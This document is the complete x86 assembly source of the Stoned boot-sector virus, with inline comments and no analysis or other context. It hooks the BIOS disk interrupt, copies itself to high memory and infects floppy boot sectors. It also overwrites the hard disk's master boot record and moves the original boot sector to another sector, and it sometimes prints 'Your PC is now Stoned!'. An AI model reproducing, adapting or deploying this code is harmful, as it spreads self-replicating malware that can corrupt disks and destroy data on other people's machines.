CODE  SEGMENT

   ASSUME   CS:CODE

WORK_SPACE         EQU   512
MAXIMUM_SIZE   EQU   1BEH

VIRUS PROC  NEAR

               DB    0EAH     ;JMP   07C0:0005
               DW    5,7C0H
               JMP   INSTALL

;  DRIVE_LETTER INDICATES BOOT DISK,  0 = A:, 2 = C:

DRIVE_LETTER        DB   0

OLD_13  LABEL DWORD
OFFS           DW   ?
SEGM           DW   ?

NEW_ADDRESS LABEL DWORD
               DW   CONTINUE
NEW_SEGMENT DW   0

REBOOT    LABEL DWORD
               DW   7C00H,0

NEW_13:
   PUSH  DS
   PUSH  AX
   CMP   AH,2             
   JC    SPINNING         
   CMP   AH,4
   JNC   SPINNING         
   OR    DL,DL             ; IS IT DRIVE A:?
   JNZ   SPINNING          ; JUMP IF NOT
   XOR   AX,AX
   MOV   DS,AX             
   MOV   AL,DS:43FH        ; IS DRIVE MOTOR SPINNING?
   TEST  AL,1              ; IF YES THEN JUMP
   JNZ   SPINNING
               

; INT13 REQUEST IS FOR READ OR WRITE TO A: - MOTOR NOT YET STARTED.

   CALL  INFECT            ; NOT SPINNING - INFECT
SPINNING:
   POP   AX
   POP   DS
   JMP   CS:[OLD_13]     

INFECT:
   PUSH  BX                ; SAVE REGISTERS
   PUSH  CX
   PUSH  DX
   PUSH  ES
   PUSH  SI
   PUSH  DI
   MOV   SI,4              ; MAKE FOUR ATTEMPTS
GET_BOOT_SECTOR:
   MOV   AX,201H           ; READ SECTOR
   PUSH  CS                
   POP   ES                
   MOV   BX,OFFSET WORK_SPACE
   XOR   CX,CX             ; TRACK 0, SECTOR 0
   MOV   DX,CX             ; HEAD 0, DRIVE 0
   INC   CX                
   PUSHF                   
   CALL  CS:[OLD_13]
   JNC   BOOT_IS_DONE      ; READ OK.
   XOR   AX,AX             ; DRIVE RESET
   PUSHF
   CALL  CS:[OLD_13]
   DEC   SI                ; COUNT NUMBER OF TRIES
   JNZ   GET_BOOT_SECTOR   ; LOOP
   JMP   FINISH        
BOOT_IS_DONE:
   XOR   SI,SI             ; CODE SEGMENT START 
   MOV   DI,OFFSET WORK_SPACE  ; POINTER TO BOOT SECTOR
   CLD                     
   PUSH  CS      
   POP   DS                
   LODSW                   
   CMP   AX,DS:[DI]        ; OURS?
   JNZ   CREATE_BOOT       ; NO, CREATE BOOT
   LODSW                   ; RETRY
   CMP   AX,DS:[DI+2]      ; OURS?
   JZ    FINISH            ; NO, FINISH UP
CREATE_BOOT:
   MOV   AX,301H           ; WRITE ORIGINAL BOOT SECTOR FROM BUFFER
   MOV   BX,OFFSET WORK_SPACE  
   MOV   CL,3              
   MOV   DH,1              
                           
   PUSHF
   CALL  CS:[OLD_13]     ; WRITE 
   JC    FINISH        
   MOV   AX,301H         
   XOR   BX,BX           
   MOV   CL,01           
   XOR   DX,DX           
   PUSHF
   CALL  CS:[OLD_13]     
FINISH:
   POP   DI                ; RESTORE REGISTERS
   POP   SI
   POP   ES
   POP   DX
   POP   CX
   POP   BX
   RET

INSTALL:
   XOR   AX,AX
   MOV   DS,AX
   CLI
   MOV   SS,AX
   MOV   SP,7C00H        
   STI                     ; ENABLE INTERRUPTS
   MOV   AX,DS:4CH         ; SAVE OLD 13H 
   MOV   DS:[OFFS+7C00H],AX
   MOV   AX,DS:4EH
   MOV   DS:[SEGM+7C00H],AX
   MOV   AX,DS:413H        ; MEMORY AVAILABLE 
   DEC   AX                
   DEC   AX                
   MOV   DS:413H,AX        
   MOV   CL,6 
   SHL   AX,CL
   MOV   ES,AX                          ; ES: = FREE MEMORY ADDRESS
   MOV   DS:[NEW_SEGMENT+7C00H],AX   ; PUT IT INTO NEW JUMP VECTOR

   MOV   AX,OFFSET NEW_13             ; INSTALL NEW VIRUS VECTOR
   MOV   DS:4CH,AX
   MOV   DS:4EH,ES

   MOV   CX,OFFSET ENDOFPROGMEM
   PUSH  CS
   POP   DS                ; DS POINTS TO OUR CODE SEGMENT
   XOR   SI,SI             ; SI POINTS TO 0
   MOV   DI,SI             ; DI POINTS TO 0
   CLD                     ; SET DIRECTION FLAG TO INCREMENT
   REP   MOVSB             ; MOVE OURSELVES INTO HIGH MEMORY!
   JMP   NEW_ADDRESS    ; THIS JUMP TRANSFERS TO CONTINUE BUT IN HIGH MEM


; THE FOLLOWING CODE IS EXECUTED AFTER BEING MOVED TO HIGH MEMORY
; EXECUTION IS VIA THE JUMP TO NEW_ADDRESS

CONTINUE:
   MOV   AX,0              ; RESET DISK SYSTEM
   INT   13H               ; THIS IS THE INFECTED INT 13H

   XOR   AX,AX             ; READ REAL BOOT SECTOR
   MOV   ES,AX
   MOV   AX,201H
   MOV   BX,7C00H          ; INTO THE BOOT AREA OF RAM
   CMP   DRIVE_LETTER,0
   JZ    BOOT_A
BOOT_C:
   MOV   CX,0002H          ; FROM SECTOR 2 TRACK 0  HEAD 0 FOR FIRST HD
   MOV   DX,0080H
   INT   13H
   JMP   QUITPROG
BOOT_A:
   MOV   CX,0003H          ; FROM SECTOR 3 TRACK 0 HEAD 1 FOR DRIVE A:
   MOV   DX,0100H
   INT   13H
   JC    QUITPROG          ; FAILED READ!

   TEST  BYTE PTR ES:46CH,7   ; CHECK SYSTEM CLOCK LAST 3 BITS
   JNZ   NOMESSAGE
   MOV   SI,OFFSET MESSAGE    ; DS IS POINTING TO 7C0:000 WHICH
   PUSH  CS
   POP   DS
MSGLOOP:
   LODSB                   ; ALSO HAS THE TEXT
   OR    AL,AL
   JZ    NOMESSAGE
   MOV   AH,14
   MOV   BH,0
   INT   10H
   JMP   MSGLOOP

NOMESSAGE:
   PUSH  CS
   POP   ES
   MOV   AX,201H
   MOV   BX,OFFSET WORK_SPACE  ; READ BOOT SECTOR FROM HARD DISK
   MOV   CL,1    
   MOV   DX,0080H
   INT   13H
   JC    QUITPROG          ; BAD READ - SO JUMP
   PUSH  CS
   POP   DS
   MOV   SI,OFFSET WORK_SPACE  ; SOURCE IS THE BOOT SECTOR
   MOV   DI,0              ; DESTINATION IS OUR OWN CODE
   LODSW                   ; MOV  AX,DS:[SI]
                           ; ADD  SI,2
   CMP   AX,DS:[DI]        ; VIRUS?
   JNZ   SAVEBOOT          ; JUMP IF NOT
   LODSW                   ; MOV  AX,DS:[SI]
                           ; ADD  SI,2
   CMP   AX,DS:[DI+2]      ; HAS IT GOT A VIRUS?
   JNZ   SAVEBOOT
QUITPROG:
   MOV   DRIVE_LETTER,0         ; YES - SO BOOT DRIVE 0 FOR A>
   JMP   REBOOT            ; THIS JUMPS TO 0:7C00H TO CONTINUE BOOT CODE

SAVEBOOT:
   MOV   DRIVE_LETTER,2         ; DRIVE 2 FOR C>
   MOV   AX,301H           ; GONNA WRITE
   MOV   BX,OFFSET WORK_SPACE  ; OLD BOOT SECTOR
   MOV   CX,0007H          ; TO SECTOR 7
   MOV   DX,0080H          ;       OF DRIVE C>
   INT   13H
   JC    QUITPROG
   PUSH  CS
   POP   DS
   PUSH  CS
   POP   ES
   MOV   SI,OFFSET WORK_SPACE+MAXIMUM_SIZE
   MOV   DI,MAXIMUM_SIZE
   MOV   CX,400H-MAXIMUM_SIZE
   REP   MOVSB             ; SI -> DI AND INC BOTH    CX TIMES
   MOV   AX,301H           ; GONNA WRITE BOOT SECTOR
   XOR   BX,BX             ; FROM TOP OF OUR CODE
   INC   CL                ; SECTOR 1
;  MOV   DX,0080H          ;<-- DX IS LEFT OVER FROM ABOVE
   INT   13H               ; DO IT
   JMP   QUITPROG
                      
MESSAGE:
         DB 7,'Your PC is now Stoned!',7,13,10,10,0
         DB 'LEGALISE MARIJUANA!'    ; This bit doesn't display!
ENDOFPROGMEM:

VIRUS ENDP

CODE  ENDS
   END   VIRUS

